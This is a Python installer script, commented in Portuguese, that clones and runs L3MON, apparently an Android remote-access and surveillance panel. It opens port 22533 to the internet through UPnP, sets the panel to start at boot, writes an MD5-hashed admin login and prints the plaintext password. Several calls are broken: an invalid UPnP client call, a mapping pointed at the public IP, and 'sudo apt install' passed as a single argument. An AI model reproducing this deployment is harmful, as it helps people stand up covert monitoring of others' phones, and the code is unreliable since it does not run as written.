#!/usr/bin/env python3

import os
import subprocess
import requests
import socket
import upnpclient

# Função para obter o IP público utilizando o serviço "ipinfo.io"
def get_public_ip():
    try:
        response = requests.get('https://ipinfo.io')
        data = response.json()
        return data['ip']
    except:
        return None

# Função para configurar o redirecionamento de portas utilizando o IP público obtido
def configure_port_forwarding(ip_publico):
    try:
        # Verifica se o usuário é root (ou seja, se está sendo executado com privilégios de administrador).
        if os.getuid() == 0:
            # Define a porta interna em que o aplicativo L3MON está sendo executado.
            porta_interna = 22533

            # Inicia o cliente UPnP e tenta configurar o redirecionamento de portas.
            upnp = upnpclient.upnpclient()
            upnp.get_igd().add_port_mapping(porta_interna, "TCP", ip_publico, porta_interna, "L3MON", "")
        else:
            print("Este script precisa ser executado com privilégios de administrador (root).")
    except Exception as e:
        print("Ocorreu um erro ao configurar o redirecionamento de portas:", e)

# Obtém o IP público do roteador utilizando o serviço "ipinfo.io"
ip_publico = get_public_ip()
if ip_publico:
    print(f"IP Público: {ip_publico}")
    configure_port_forwarding(ip_publico)
else:
    print("Não foi possível obter o IP público. Verifique sua conexão com a Internet.")

# Verifica se o usuário é root ou não (ou seja, se está sendo executado com privilégios de administrador).
if os.getuid() == 0:
    # O usuário é root, definimos algumas variáveis para os comandos
    INSTALL_CMD = "apt install"
    NODE_CMD = "npm"
    PM2_CMD = "pm2"
else:
    # O usuário não é root, definimos algumas variáveis para os comandos
    INSTALL_CMD = "sudo apt install"
    NODE_CMD = "sudo npm"
    PM2_CMD = "sudo pm2"

# Verifica se o diretório do repositório já existe; se não, clona o repositório
if not os.path.exists("L3MON"):
    subprocess.run(["git", "clone", "https://github.com/efxtv/L3MON.git"])

# Move o script para dentro do diretório do repositório L3MON (exceto o próprio diretório do script)
script_dir = os.path.dirname(os.path.abspath(__file__))
l3mon_dir = os.path.join("L3MON", os.path.basename(script_dir))
if script_dir != l3mon_dir:
    os.rename(script_dir, l3mon_dir)

# Acessa o diretório do repositório clonado
os.chdir("L3MON")

# Instala as dependências
subprocess.run([INSTALL_CMD, "wget", "curl", "git", "npm", "nano", "nodejs", "openjdk-8-jdk", "openjdk-8-jre"])

# Instala dependências adicionais e inicia o aplicativo
subprocess.run([NODE_CMD, "install"])
subprocess.run([NODE_CMD, "audit", "fix"])
subprocess.run([NODE_CMD, "audit"])
subprocess.run([NODE_CMD, "install"])
subprocess.run([PM2_CMD, "start", "index.js"])
subprocess.run([PM2_CMD, "startup"])

# Obtém o nome de usuário do usuário
username = input("Digite o nome de usuário (username): ")

# Obtém a senha do usuário para gerar a hash MD5
senha = input("Digite a senha: ")
md5hash = subprocess.run(["echo", "-n", senha], capture_output=True, text=True)
md5hash = subprocess.run(["openssl", "md5"], input=md5hash.stdout.encode(), capture_output=True, text=True)
md5hash = md5hash.stdout.split(" ")[-1].strip()

# Cria o arquivo maindb.json
with open("maindb.json", "w") as f:
    f.write('''{
  "admin": {
    "username": "''' + username + '''",
    "password": "''' + md5hash + '''",
    "loginToken": "",
    "logs": [],
    "ipLog": []
  },
  "clients": []
}
''')

# Obtém o IP do sistema
ip = os.popen("hostname -I | awk '{print $1}'").read().strip()

# Gera o link
link = f"http://{ip}:22533"

print(f"Link gerado: {link}")
print(f"Credenciais: User:{username} Pass:{senha}")
